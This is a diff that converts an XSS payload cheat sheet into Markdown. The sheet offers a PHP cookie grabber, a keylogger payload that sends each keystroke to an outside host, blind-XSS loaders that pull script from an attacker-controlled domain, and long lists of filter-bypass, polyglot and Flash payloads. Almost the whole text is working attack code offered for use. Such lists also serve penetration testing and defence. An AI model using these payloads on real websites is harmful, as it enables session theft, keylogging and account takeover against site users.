@@ -1,5 +1,5 @@
-Exploit code or POC
-Cookie grabber for XSS
+# Exploit code or POC
+## Cookie grabber for XSS
 ```
 <?php
 // How to use it
@@ -14,29 +14,26 @@ fwrite($fp, 'Cookie:' .$cookie.'\r\n');
 fclose($fp);
 
 ?>
-Keylogger for XSS
+```
 
+## Keylogger for XSS
+```
 <img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
 More exploits at http://www.xss-payloads.com/payloads-list.html?a#category=all:
+```
 
-Taking screenshots using XSS and the HTML5 Canvas
-JavaScript Port Scanner
-Network Scanner
-.NET Shell execution
-Redirect Form
-Play Music
-Identify an XSS endpoint
-<script>debugger;</script>
-XSS in HTML/Applications
-XSS Basic
+## XSS Basic
 
-Basic payload
+### Basic payload
+```
 <script>alert('XSS')</script>
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
 "><script>alert('XSS')</script>
 "><script>alert(String.fromCharCode(88,83,83))</script>
+```
 
-Img payload
+### Img payload
+```
 <img src=x onerror=alert('XSS');>
 <img src=x onerror=alert('XSS')//
 <img src=x onerror=alert(String.fromCharCode(88,83,83));>
@@ -44,8 +41,10 @@ Img payload
 <img src=x:alert(alt) onerror=eval(src) alt=xss>
 "><img src=x onerror=alert('XSS');>
 "><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+```
 
-Svg payload
+### Svg payload
+```
 <svgonload=alert(1)>
 <svg/onload=alert('XSS')>
 <svg onload=alert(1)//
@@ -53,8 +52,10 @@ Svg payload
 <svg id=alert(1) onload=eval(id)>
 "><svg/onload=alert(String.fromCharCode(88,83,83))>
 "><svg/onload=alert(/XSS/)
-XSS for HTML5
+```
 
+### XSS for HTML5
+```
 <body onload=alert(/XSS/.source)>
 <input autofocus onfocus=alert(1)>
 <select autofocus onfocus=alert(1)>
@@ -71,13 +72,18 @@ XSS for HTML5
 <body ontouchstart=alert(1)> // Triggers when a finger touch the screen
 <body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen
 <body ontouchmove=alert(1)>  // When a finger is dragged across the screen.
-XSS using script tag (external payload)
+```
 
+### XSS using script tag (external payload)
+
+```
 <script src=14.rs>
 you can also specify an arbitratry payload with 14.rs/#payload
 e.g: 14.rs/#alert(document.domain)
-XSS in META tag
+```
 
+### XSS in META tag
+```
 Base64 encoded
 <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
 
@@ -89,15 +95,19 @@ XSS in Hidden input
 
 <input type="hidden" accesskey="X" onclick="alert(1)">
 Use CTRL+SHIFT+X to trigger the onclick event
-DOM XSS
+```
 
+### DOM XSS
+```
 #"><img src=/ onerror=alert(2)>
 XSS in JS Context (payload without quote/double quote from @brutelogic
 
 -(confirm)(document.domain)//
 ; alert(1);//
-XSS URL
+```
 
+### XSS URL
+```
 URL/<svg onload=alert(1)>
 URL/<script>alert('XSS');//
 URL/<input autofocus onfocus=alert(1)>
@@ -126,30 +136,38 @@ Using the escape character
 Using the newline and a comment //
 javascript://%0Aalert(1)
 javascript://anything%0D%0A%0D%0Awindow.alert(1)
-XSS with data:
+```
 
+### XSS with data:
+```
 data:text/html,<script>alert(0)</script>
 data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
 <script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
 XSS with vbscript: only IE
 
 vbscript:msgbox("XSS")
-XSS in files
-** NOTE:** The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.
+```
 
+### XSS in files
+** NOTE:** The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.
+```
 <name>
   <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
 </name>
-XSS in XML
+```
 
+### XSS in XML
+```
 <html>
 <head></head>
 <body>
 <something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
 </body>
 </html>
-XSS in SVG
+```
 
+### XSS in SVG
+```
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 
@@ -159,15 +177,19 @@ XSS in SVG
     alert(document.domain);
   </script>
 </svg>
-XSS in SVG (short)
+```
 
+### XSS in SVG (short)
+```
 <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
 
 <svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
 <svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
 <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
-XSS in Markdown
+```
 
+### XSS in Markdown
+```
 [a](javascript:prompt(document.cookie))
 [a](j a v a s c r i p t:prompt(document.cookie))
 [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
@@ -178,9 +200,11 @@ Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.
 IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
 IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
 more payloads in ./files
+```
 
-XSS in SWF flash application
+### XSS in SWF flash application
 
+```
 flashmediaelement.swf?jsinitfunctio%gn=alert`1`
 flashmediaelement.swf?jsinitfunctio%25gn=alert(1)
 ZeroClipboard.swf?id=\"))} catch(e) {alert(1);}//&width=1000&height=1000
@@ -197,8 +221,10 @@ video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
 bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4
 flashcanvas.swf?id=test\"));}catch(e){alert(document.domain)}//
 phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domain)}//
-XSS in CSS
+```
 
+### XSS in CSS
+```
 <!DOCTYPE html>
 <html>
 <head>
@@ -213,12 +239,14 @@ div  {
     <div>lol</div>
   </body>
 </html>
-Blind XSS
+```
+
+###Blind XSS
 XSS Hunter
 Available at https://xsshunter.com/app
 
 XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.
-
+```
 "><script src=//yoursubdomain.xss.ht></script>
 
 javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursubdomain.xss.ht\';document.body.appendChild(a)')
@@ -226,6 +254,7 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursu
 <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//yoursubdomain.xss.ht");a.send();</script>
 
 <script>$.getScript("//yoursubdomain.xss.ht")</script>
+```
 Other tools for Blind XSS
 sleepy-puppy - Netflix
 bXSS - LewisArdern
@@ -234,18 +263,23 @@ ezXSS - ssl
 Polyglot XSS
 Polyglot XSS - 0xsobky
 
+```
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 Polyglot XSS - Ashar Javed
-
+```
+```
 ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
 Polyglot XSS - Mathias Karlsson
-
+```
+```
 " onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
 Polyglot XSS - Rsnake
-
+```
+```
 ';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
 Polyglot XSS - Daniel Miessler
-
+```
+```
 ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 “ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
 '">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
@@ -262,25 +296,32 @@ javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
 /</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
 Polyglot XSS - @s0md3v
 https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg
-
+```
+```
 -->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
 https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large
-
+```
+```
 <svg%0Ao%00nload=%09((pro\u006dpt))()//
 Polyglot XSS - from @filedescriptor's Polyglot Challenge
-
+```
+```
 # by crlf
 javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
-
+```
+```
 # by europa
 javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>
-
+```
+```
 # by EdOverflow
 javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
-
+```
+```
 # by h1/ragnar
 javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`
-Filter Bypass and exotic payloads
+```
+### Filter Bypass and exotic payloads
 Bypass case sensitive
 
 <sCrIpt>alert(1)</ScRipt>
